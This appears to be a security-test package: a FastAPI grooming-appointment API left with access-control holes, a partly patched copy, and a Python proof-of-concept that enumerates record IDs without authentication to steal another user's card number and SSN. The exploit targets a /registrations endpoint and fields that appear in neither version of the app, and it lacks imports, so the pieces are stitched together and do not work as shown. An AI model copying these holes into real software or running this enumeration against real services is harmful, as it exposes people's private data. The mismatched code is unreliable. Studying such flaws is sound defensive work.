from fastapi import FastAPI, Header, HTTPException
from pydantic import BaseModel
from typing import Optional
import secrets

app = FastAPI()

users = {}
tokens = {}
groomers = {}
appointments = {}

user_counter = 0
groomer_counter = 0
appointment_counter = 0


class SignupRequest(BaseModel):
    class Config:
        extra = "allow"


class LoginRequest(BaseModel):
    username: str
    password: str


def get_user_from_token(authorization: Optional[str]):
    if not authorization:
        raise HTTPException(status_code=401, detail="Missing token")
    token = authorization.replace("Bearer ", "").strip()
    user_id = tokens.get(token)
    if user_id is None:
        raise HTTPException(status_code=401, detail="Invalid token")
    return users[user_id]


@app.post("/signup")
async def signup(payload: dict):
    global user_counter
    user_counter += 1
    user = dict(payload)
    user["id"] = user_counter
    users[user_counter] = user
    return user


@app.post("/login")
async def login(req: LoginRequest):
    for user in users.values():
        if user.get("username") == req.username and user.get("password") == req.password:
            token = secrets.token_hex(16)
            tokens[token] = user["id"]
            return {"token": token}
    raise HTTPException(status_code=401, detail="Invalid credentials")


@app.post("/groomers")
async def create_groomer(payload: dict, authorization: Optional[str] = Header(None)):
    global groomer_counter
    user = get_user_from_token(authorization)
    groomer_counter += 1
    groomer = dict(payload)
    groomer["id"] = groomer_counter
    groomer["user_id"] = user["id"]
    groomers[groomer_counter] = groomer
    return groomer


@app.get("/groomers/{groomer_id}")
async def get_groomer(groomer_id: int):
    groomer = groomers.get(groomer_id)
    if groomer is None:
        raise HTTPException(status_code=404, detail="Not found")
    return groomer


@app.post("/appointments")
async def create_appointment(payload: dict, authorization: Optional[str] = Header(None)):
    global appointment_counter
    user = get_user_from_token(authorization)
    appointment_counter += 1
    appointment = dict(payload)
    appointment["id"] = appointment_counter
    appointment["user_id"] = user["id"]
    appointments[appointment_counter] = appointment
    return appointment


@app.get("/appointments/{appointment_id}")
async def get_appointment(appointment_id: int):
    appointment = appointments.get(appointment_id)
    if appointment is None:
        raise HTTPException(status_code=404, detail="Not found")
    return appointment

from fastapi import FastAPI, Header, HTTPException
from pydantic import BaseModel
from typing import Optional
import secrets

app = FastAPI()

users = {}
tokens = {}
groomers = {}
appointments = {}

user_counter = 0
groomer_counter = 0
appointment_counter = 0


class SignupRequest(BaseModel):
    class Config:
        extra = "allow"


class LoginRequest(BaseModel):
    username: str
    password: str


def get_user_from_token(authorization: Optional[str]):
    if not authorization:
        raise HTTPException(status_code=401, detail="Missing token")
    token = authorization.replace("Bearer ", "").strip()
    user_id = tokens.get(token)
    if user_id is None:
        raise HTTPException(status_code=401, detail="Invalid token")
    return users[user_id]


@app.post("/signup")
async def signup(payload: dict):
    global user_counter
    user_counter += 1
    user = dict(payload)
    user["id"] = user_counter
    users[user_counter] = user
    return user


@app.post("/login")
async def login(req: LoginRequest):
    for user in users.values():
        if user.get("username") == req.username and user.get("password") == req.password:
            token = secrets.token_hex(16)
            tokens[token] = user["id"]
            return {"token": token}
    raise HTTPException(status_code=401, detail="Invalid credentials")


@app.post("/groomers")
async def create_groomer(payload: dict, authorization: Optional[str] = Header(None)):
    global groomer_counter
    user = get_user_from_token(authorization)
    groomer_counter += 1
    groomer = dict(payload)
    groomer["id"] = groomer_counter
    groomer["user_id"] = user["id"]
    groomers[groomer_counter] = groomer
    return groomer


@app.get("/groomers/{groomer_id}")
async def get_groomer(groomer_id: int):
    groomer = groomers.get(groomer_id)
    if groomer is None:
        raise HTTPException(status_code=404, detail="Not found")
    return groomer


@app.post("/appointments")
async def create_appointment(payload: dict, authorization: Optional[str] = Header(None)):
    global appointment_counter
    user = get_user_from_token(authorization)
    appointment_counter += 1
    appointment = dict(payload)
    appointment["id"] = appointment_counter
    appointment["user_id"] = user["id"]
    appointments[appointment_counter] = appointment
    return appointment


@app.get("/appointments/{appointment_id}")
async def get_appointment(appointment_id: int, authorization: Optional[str] = Header(None)):
    user = get_user_from_token(authorization)
    appointment = appointments.get(appointment_id)
    if appointment is None:
        raise HTTPException(status_code=404, detail="Not found")
    if appointment.get("user_id") != user["id"]:
        raise HTTPException(status_code=404, detail="Not found")
    return appointment

BASE = "http://127.0.0.1:8000"


def signup(username, password, extra=None):
    payload = {"username": username, "password": password}
    if extra:
        payload.update(extra)
    r = requests.post(f"{BASE}/signup", json=payload)
    return r.json()


def login(username, password):
    r = requests.post(f"{BASE}/login", json={"username": username, "password": password})
    return r.json()["token"]


def main():
    # Victim creates a private registration with sensitive data
    signup("victim", "victimpass")
    victim_token = login("victim", "victimpass")

    secret_data = {
        "credit_card": "4111-1111-1111-1111",
        "ssn": "123-45-6789",
        "notes": "victim private registration",
    }
    r = requests.post(
        f"{BASE}/registrations",
        json=secret_data,
        headers={"Authorization": f"Bearer {victim_token}"},
    )
    victim_reg = r.json()
    victim_reg_id = victim_reg["id"]

    # Attacker signs up
    signup("attacker", "attackerpass")
    attacker_token = login("attacker", "attackerpass")

    # GET /registrations/{id} requires NO auth and enforces NO ownership check
    # Enumerate sequential IDs to read other users' registrations
    pwned = False
    for rid in range(1, victim_reg_id + 5):
        # Attempt completely unauthenticated read
        resp = requests.get(f"{BASE}/registrations/{rid}")
        if resp.status_code == 200:
            data = resp.json()
            owner = data.get("owner_user_id")
            # Confirm we read the victim's sensitive data we shouldn't access
            if data.get("credit_card") == secret_data["credit_card"] or \
               data.get("ssn") == secret_data["ssn"]:
                print(f"Read registration {rid} (owner_user_id={owner}) without auth:")
                print(data)
                pwned = True

    if pwned:
        print("PWNED")
        sys.exit(0)
    else:
        print("safe")
        sys.exit(1)


if __name__ == "__main__":
    main()
